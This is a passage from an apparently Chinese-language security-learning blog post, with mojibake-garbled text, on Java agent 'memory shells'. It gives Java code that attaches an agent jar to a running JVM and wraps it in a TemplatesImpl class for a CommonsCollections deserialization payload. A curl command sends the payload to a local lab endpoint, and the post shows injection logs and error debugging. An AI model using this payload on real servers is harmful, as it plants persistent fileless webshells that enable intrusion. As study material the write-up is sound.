class="hljs-string">&quot;displayName&quot;</span>,<span class="hljs-literal">null</span>);<br>                java.lang.<span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> (java.lang.String) displayName.invoke(o,<span class="hljs-literal">null</span>);<br>                <span class="hljs-comment">// åˆ—å‡ºå½“å‰æœ‰å“ªäº› JVM è¿›ç¨‹åœ¨è¿è¡Œ</span><br>                <span class="hljs-comment">// è¿™é‡Œçš„ if æ¡ä»¶æ ¹æ®å®é™…æƒ…å†µè¿›è¡Œæ›´æ”¹</span><br>                <span class="hljs-keyword">if</span> (name.contains(<span class="hljs-string">&quot;com.src.Demo02EnvApplication&quot;</span>))&#123;<br>                    <span class="hljs-comment">// è·å–å¯¹åº”è¿›ç¨‹çš„ pid å·</span><br>                    java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">getId</span> <span class="hljs-operator">=</span> MyVirtualMachineDescriptor.getDeclaredMethod(<span class="hljs-string">&quot;id&quot;</span>,<span class="hljs-literal">null</span>);<br>                    java.lang.<span class="hljs-type">String</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> (java.lang.String) getId.invoke(o,<span class="hljs-literal">null</span>);<br>                    System.out.println(<span class="hljs-string">&quot;id &gt;&gt;&gt; &quot;</span> + id);<br>                    java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">attach</span> <span class="hljs-operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="hljs-string">&quot;attach&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;java.lang.String.class&#125;);<br>                    java.lang.<span class="hljs-type">Object</span> <span class="hljs-variable">vm</span> <span class="hljs-operator">=</span> attach.invoke(o,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;id&#125;);<br>                    java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">loadAgent</span> <span class="hljs-operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="hljs-string">&quot;loadAgent&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;java.lang.String.class&#125;);<br>                    loadAgent.invoke(vm,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;path&#125;);<br>                    java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">detach</span> <span class="hljs-operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="hljs-string">&quot;detach&quot;</span>,<span class="hljs-literal">null</span>);<br>                    detach.invoke(vm,<span class="hljs-literal">null</span>);<br>                    System.out.println(<span class="hljs-string">&quot;Agent.jar Inject Success !!&quot;</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>







<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523682.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h4 id="CC-ååºåˆ—åŒ–æ³¨å…¥"><a href="#CC-ååºåˆ—åŒ–æ³¨å…¥" class="headerlink" title="CC ååºåˆ—åŒ–æ³¨å…¥"></a>CC ååºåˆ—åŒ–æ³¨å…¥</h4><p>é€šè¿‡CCååºåˆ—åŒ–è¿›è¡Œæ³¨å…¥Agentå†…å­˜é©¬ï¼Œ ç¼–è¯‘ç”Ÿæˆ <code>Test.class</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span>&#123;<br>            java.lang.<span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;D:\\JavaCode\\å†…å­˜é©¬\\AgentMem\\Demo02\\target\\Demo02-1.0-SNAPSHOT.jar&quot;</span>;<br>            java.io.<span class="hljs-type">File</span> <span class="hljs-variable">toolsPath</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.File(System.getProperty(<span class="hljs-string">&quot;java.home&quot;</span>).replace(<span class="hljs-string">&quot;jre&quot;</span>,<span class="hljs-string">&quot;lib&quot;</span>) + java.io.File.separator + <span class="hljs-string">&quot;tools.jar&quot;</span>);<br>            java.net.<span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> toolsPath.toURI().toURL();<br>            java.net.<span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URLClassLoader(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URL[]&#123;url&#125;);<br>            Class<span class="hljs-comment">/*&lt;?&gt;*/</span> MyVirtualMachine = classLoader.loadClass(<span class="hljs-string">&quot;com.sun.tools.attach.VirtualMachine&quot;</span>);<br>            Class<span class="hljs-comment">/*&lt;?&gt;*/</span> MyVirtualMachineDescriptor = classLoader.loadClass(<span class="hljs-string">&quot;com.sun.tools.attach.VirtualMachineDescriptor&quot;</span>);<br>            java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">listMethod</span> <span class="hljs-operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="hljs-string">&quot;list&quot;</span>,<span class="hljs-literal">null</span>);<br>            java.util.List<span class="hljs-comment">/*&lt;Object&gt;*/</span> list = (java.util.List<span class="hljs-comment">/*&lt;Object&gt;*/</span>) listMethod.invoke(MyVirtualMachine,<span class="hljs-literal">null</span>);<br><br>            System.out.println(<span class="hljs-string">&quot;Running JVM list ...&quot;</span>);<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;list.size();i++)&#123;<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> list.get(i);<br>                java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">displayName</span> <span class="hljs-operator">=</span> MyVirtualMachineDescriptor.getDeclaredMethod(<span class="hljs-string">&quot;displayName&quot;</span>,<span class="hljs-literal">null</span>);<br>                java.lang.<span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> (java.lang.String) displayName.invoke(o,<span class="hljs-literal">null</span>);<br>                <span class="hljs-comment">// åˆ—å‡ºå½“å‰æœ‰å“ªäº› JVM è¿›ç¨‹åœ¨è¿è¡Œ</span><br>                <span class="hljs-comment">// è¿™é‡Œçš„ if æ¡ä»¶æ ¹æ®å®é™…æƒ…å†µè¿›è¡Œæ›´æ”¹</span><br>                <span class="hljs-keyword">if</span> (name.contains(<span class="hljs-string">&quot;com.src.Demo02EnvApplication&quot;</span>))&#123;<br>                    <span class="hljs-comment">// è·å–å¯¹åº”è¿›ç¨‹çš„ pid å·</span><br>                    java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">getId</span> <span class="hljs-operator">=</span> MyVirtualMachineDescriptor.getDeclaredMethod(<span class="hljs-string">&quot;id&quot;</span>,<span class="hljs-literal">null</span>);<br>                    java.lang.<span class="hljs-type">String</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> (java.lang.String) getId.invoke(o,<span class="hljs-literal">null</span>);<br>                    System.out.println(<span class="hljs-string">&quot;id &gt;&gt;&gt; &quot;</span> + id);<br>                    java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">attach</span> <span class="hljs-operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="hljs-string">&quot;attach&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;java.lang.String.class&#125;);<br>                    java.lang.<span class="hljs-type">Object</span> <span class="hljs-variable">vm</span> <span class="hljs-operator">=</span> attach.invoke(o,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;id&#125;);<br>                    java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">loadAgent</span> <span class="hljs-operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="hljs-string">&quot;loadAgent&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;java.lang.String.class&#125;);<br>                    loadAgent.invoke(vm,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;path&#125;);<br>                    java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">detach</span> <span class="hljs-operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="hljs-string">&quot;detach&quot;</span>,<span class="hljs-literal">null</span>);<br>                    detach.invoke(vm,<span class="hljs-literal">null</span>);<br>                    System.out.println(<span class="hljs-string">&quot;Agent.jar Inject Success !!&quot;</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Test</span><span class="hljs-params">()</span>&#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>





<p> ç”¨ <strong>java-chains</strong> , æŠŠ <code>Test.class</code> æ³¨å…¥åˆ° <code>TemplatesImpl</code> çš„ <code>_bytecodes</code>ï¼Œç”Ÿæˆäº† <code>JavaNativePayload_â€¦txt</code> æ–‡ä»¶ã€‚  </p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081525081.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081525372.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523154.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">curl -v <span class="hljs-string">&quot;http://localhost:8089/cc&quot;</span> --data-<span class="hljs-built_in">binary</span> <span class="hljs-symbol">@test</span>.ser<br></code></pre></td></tr></table></figure>



<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081525511.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<ol>
<li>å†…å­˜é©¬æ³¨å…¥æƒ…å†µ</li>
</ol>
<p>ä»æ—¥å¿—æ¥çœ‹ï¼š</p>
<p>Running JVM list â€¦</p>
<p>id &gt;&gt;&gt; 40008</p>
<p>Find the Inject Class: org.apache.catalina.core.ApplicationFilterChain</p>
<p>Agent.jar Inject Success !!</p>
<p>ä½¿ç”¨çš„ Demo02-1.0-SNAPSHOT.jar æˆåŠŸ attach åˆ°äº†ç›®æ ‡ JVMï¼ˆPID 40008ï¼‰ã€‚</p>
<p>org.apache.catalina.core.ApplicationFilterChain ä½œä¸º hook å…¥å£å·²ç»è¢«æ‰¾åˆ°ã€‚</p>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå†…å­˜é©¬çš„ Agent éƒ¨åˆ†å·²ç»æˆåŠŸåŠ è½½åˆ° JVMã€‚</p>
<p>æ‰€ä»¥æ³¨å…¥æ˜¯æˆåŠŸçš„ï¼Œè¿™éƒ¨åˆ†æ²¡æœ‰é—®é¢˜</p>
<p>1. </p>
<p> curl è¯·æ±‚è§¦å‘äº† POST &#x2F;ccï¼Œä½†æ˜¯è¿”å›ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">java.lang.NullPointerException: <span class="hljs-literal">null</span><br>	at com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.postInitialization(AbstractTranslet.java:<span class="hljs-number">372</span>) ~[na:<span class="hljs-number">1.8</span><span class="hljs-number">.0_65</span>]<br>	at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:<span class="hljs-number">456</span>) ~[na:<span class="hljs-number">1.8</span><span class="hljs-number">.0_65</span>]<br>	at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:<span class="hljs-number">486</span>) ~[na:<span class="hljs-number">1.8</span><span class="hljs-number">.0_65</span>]<br>	at com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.&lt;init&gt;(TrAXFilter.java:<span class="hljs-number">64</span>) ~[na:<span class="hljs-number">1.8</span><span class="hljs-number">.0_65</span>]<br>	at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) ~[na:<span class="hljs-number">1.8</span><span class="hljs-number">.0_65</span>]<br>	at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:<span class="hljs-number">62</span>) ~[na:<span class="hljs-number">1.8</span><span class="hljs-number">.0_65</span>]<br>	at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:<span class="hljs-number">45</span>) ~[na:<span class="hljs-number">1.8</span><span class="hljs-number">.0_65</span>]<br>	at java.lang.reflect.Constructor.newInstance(Constructor.java:<span class="hljs-number">422</span>) ~[na:<span class="hljs-number">1.8</span><span class="hljs-number">.0_65</span>]<br></code></pre></td></tr></table></figure>



<p>åˆ†æåŸå› ï¼š</p>
<p>ä½ ä¸Šä¼ çš„ payload æ˜¯åŸºäº CommonsCollections K3 + TemplatesImpl çš„åºåˆ—åŒ–ã€‚</p>
<p>é”™è¯¯å‘ç”Ÿåœ¨ TemplatesImpl åˆå§‹åŒ–é˜¶æ®µçš„ postInitialization æ–¹æ³•ï¼š</p>
<p>NullPointerException ä¸€èˆ¬æ˜¯å› ä¸º TemplatesImpl ä¸­ _bytecodes æˆ– _name ç­‰å­—æ®µä¸º nullã€‚</p>
<p>ä¹Ÿå°±æ˜¯è¯´  test.ser æ–‡ä»¶ä¸­ï¼Œ<strong>TemplatesImpl å¯¹è±¡æ²¡æœ‰æ­£ç¡®å¡«å……å­—èŠ‚ç </strong>â€¦.</p>
<p>ä¸ºä»€ä¹ˆç”Ÿæˆçš„æ—¶å€™æ²¡æœ‰å†™è¿›å»å‘¢ï¼Ÿ</p>
<h1 id="å‚è€ƒï¼š"><a href="#å‚è€ƒï¼š" class="headerlink" title="å‚è€ƒï¼š"></a>å‚è€ƒï¼š</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/rebeyond/p/9686213.html">ã€åŸåˆ›ã€‘åˆ©ç”¨â€œè¿›ç¨‹æ³¨å…¥â€å®ç°æ— æ–‡ä»¶ä¸æ­»webshell</a></p>
<p><a target="_blank" rel="noopener" href="https://goodapple.top/archives/1355">Javaå®‰å…¨å­¦ä¹ â€”â€”å†…å­˜é©¬ - æ«ã®Blog</a></p>
<p><a target="_blank" rel="noopener" href="http://101.36.122.13:4000/2025/08/06/Spring%E5%86%85%E5%AD%98%E9%A9%AC/#J9TFY">Springå†…å­˜é©¬ | CurlySeanâ€™s Blog</a></p>
<p><a target="_blank" rel="noopener" href="https://y4er.com/posts/javaagent-tomcat-memshell/#%E7%AE%80%E8%BF%B0%E5%86%85%E5%AD%98shell">Java Agentå®ç°ååºåˆ—åŒ–æ³¨å…¥å†…å­˜shell</a></p>
<p><a target="_blank" rel="noopener" href="https://su18.org/post/memory-shell/">JavaWeb å†…å­˜é©¬ä¸€å‘¨ç›®é€šå…³æ”»ç•¥ | ç´ åå…«</a></p>
<p><a target="_blank" rel="noopener" href="https://su18.org/post/memory-shell-2/">JavaWeb å†…å­˜é©¬äºŒå‘¨ç›®é€šå…³æ”»ç•¥ | ç´ åå…«</a></p>
<p><a target="_blank" rel="noopener" href="https://www.4hou.com/posts/zlkq">Shellä¸­çš„å¹½çµç‹è€…â€”JAVAWEB å†…å­˜é©¬ ã€è®¤çŸ¥ç¯‡ã€‘ - å˜¶å¼ RoarTalk â€“ ç½‘ç»œå®‰å…¨è¡Œä¸šç»¼åˆæœåŠ¡å¹³å°,4hou.com</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/433972.html">Javaå†…å­˜é©¬â€”â€”Tomcat Valveå‹çš„ä¸‰ç§æ³¨å…¥ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p>
<p><a target="_blank" rel="noopener" href="https://hilang.cloud/java-%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%88%E5%9B%9B%EF%BC%89%EF%BC%9Aspring-boot-controller-%E5%86%85%E5%AD%98%E9%A9%AC/">Java å†…å­˜é©¬ï¼ˆå››ï¼‰ï¼šSpring Boot Controller å†…å­˜é©¬ | æ¸æ€€çš„åšå®¢</a></p>
<p><a target="_blank" rel="noopener" href="https://stoocea.github.io/post/Spring%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90.html#2-Controller-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC">Springå‹å†…å­˜é©¬åˆ†æ</a></p>
<p><a target="_blank" rel="noopener" href="https://www.runoob.com/servlet/servlet-intro.html">Servlet ç®€ä»‹ | èœé¸Ÿæ•™ç¨‹</a></p>
<p><a target="_blank" rel="noopener" href="https://clowsman.github.io/2024/11/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/index.html">Springå†…å­˜é©¬å­¦ä¹ </a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/11493">Springå†…å­˜é©¬â€”â€”Controller&#x2F;Interceptoræ„é€ </a></p>
<p>[åŸºç¡€ç¯‡ - Javassist ä½¿ç”¨æŒ‡å—](<a target="_blank" rel="noopener" href="https://changeyourway.github.io/2024/06/07/Java">https://changeyourway.github.io/2024/06/07/Java</a> å®‰å…¨&#x2F;åŸºç¡€ç¯‡-javassistç”¨æ³•æŒ‡å—&#x2F;)</p>
<p><a target="_blank" rel="noopener" href="https://goodapple.top/archives/1145#header-id-20">Javaå®‰å…¨å­¦ä¹ â€”â€”ROMEååºåˆ—åŒ– - æ«ã®Blog</a> ï¼ˆä½¿ç”¨Javassistç¼©çŸ­æ¶æ„classï¼‰</p>
<p><a target="_blank" rel="noopener" href="https://y4er.com/posts/javaagent-tomcat-memshell/">Java Agentå®ç°ååºåˆ—åŒ–æ³¨å…¥å†…å­˜shell</a></p>
<p><a target="_blank" rel="noopener" href="http://101.36.122.13:4000/2025/08/05/JavaAgent%E5%86%85%E5%AD%98%E9%A9%AC">Agentå†…å­˜é©¬ | CurlySeanâ€™s Blog</a></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/Java%E5%AE%89%E5%85%A8/" class="category-chain-item">Javaå®‰å…¨</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/java%E5%AE%89%E5%85%A8/" class="print-no-link">#javaå®‰å…¨</a>
      
        <a href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/" class="print-no-link">#å†…å­˜é©¬</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Java å†…å­˜é©¬ç¬¬å››ç¯‡ - Agent å†…å­˜é©¬</div>
      <div>http://xvshifu.github.io/2025/11/08/Java å†…å­˜é©¬ç¬¬å››ç¯‡ - Agent å†…å­˜é©¬/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>ä½œè€…</div>
          <div>Xvsf</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>å‘å¸ƒäº</div>
          <div>2025å¹´11æœˆ8æ—¥</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>è®¸å¯åè®®</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - ç½²å">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2025/11/08/Java%E5%86%85%E5%AD%98%E9%A9%AC%E2%80%94Tomcat%20Valve%E5%9E%8B%E7%9A%84%E4%B8%89%E7%A7%8D%E6%B3%A8%E5%85%A5/" title="Javaå†…å­˜é©¬â€”â€”Tomcat Valveå‹çš„ä¸‰ç§æ³¨å…¥">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Javaå†…å­˜é©¬â€”â€”Tomcat Valveå‹çš„ä¸‰ç§æ³¨å…¥</span>
                        <span class="visible-mobile">ä¸Šä¸€ç¯‡</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/11/08/Java%20%E5%86%85%E5%AD%98%E9%A9%AC%E7%AC%AC%E4%B8%89%E7%AF%87%20-%20Spring%20%E5%86%85%E5%AD%98%E9%A9%AC/" title="Java å†…å­˜é©¬ç¬¬ä¸‰ç¯‡ - Spring å†…å­˜é©¬">
                        <span class="hidden-mobile">Java å†…å­˜é©¬ç¬¬ä¸‰ç¯‡ - Spring å†…å­˜é©¬</span>
                        <span class="visible-mobile">ä¸‹ä¸€ç¯‡</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"0wmNTqqCOUst92FKToSXxgvQ-gzGzoHsz","appKey":"p527aBaA4G01EJdMOVMGXsHR","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":true,"recordIP":true,"serverURLs":"https://0wmntqqc.lc-cn-n1-shared.com","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>ç›®å½•</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  




  









    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">æœç´¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">å…³é”®è¯</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner" style="text-align:center; color:#555; margin-top:20px;">

  <!-- è®¡æ—¶å™¨ -->
  <div style="margin-bottom:10px; font-size:14px; color:#ff6f61;">
    ğŸš€ å·²è¿è¡Œï¼š
    <span id="timeDate">è½½å…¥å¤©æ•°...</span>
    <span id="times">è½½å…¥æ—¶åˆ†ç§’...</span>
    <script>
      function createtime() {
          var now = new Date();
          var grt = new Date("08/07/2025 00:00:00");
          var diff = now - grt;

          var days = Math.floor(diff / 1000 / 60 / 60 / 24);
          var hours = Math.floor((diff / 1000 / 60 / 60) % 24);
          var minutes = Math.floor((diff / 1000 / 60) % 60);
          var seconds = Math.floor((diff / 1000) % 60);

          if(hours<10) hours="0"+hours;
          if(minutes<10) minutes="0"+minutes;
          if(seconds<10) seconds="0"+seconds;

          document.getElementById("timeDate").innerHTML = days + " å¤©";
          document.getElementById("times").innerHTML = hours + " æ—¶ " + minutes + " åˆ† " + seconds + " ç§’";
      }
      setInterval(createtime, 1000);
      createtime();
    </script>
  </div>

  <!-- è‡ªå®šä¹‰å†…å®¹ -->
  
    <div style="margin-bottom:10px; font-size:13px; color:#666;">
      â¤ï¸  <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  


  <!-- PV/UV ç»Ÿè®¡ï¼ˆBusuanziï¼‰ -->
  
    <div style="margin-bottom:12px; font-size:14px; color:#3b82f6;">
      ğŸ‘â€ğŸ—¨ æ€»è®¿é—®é‡ï¼š<span id="busuanzi_value_page_pv">è½½å…¥ä¸­...</span>  
      ğŸ§‘ æ€»è®¿å®¢æ•°ï¼š<span id="busuanzi_value_site_uv">è½½å…¥ä¸­...</span>
    </div>
    <script src="https://cdn.tutorialjinni.com/busuanzi/2.3.0/bsz.pure.mini.js"></script>
  


</div>

<script src="/js/summon-plane.js"></script>



  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
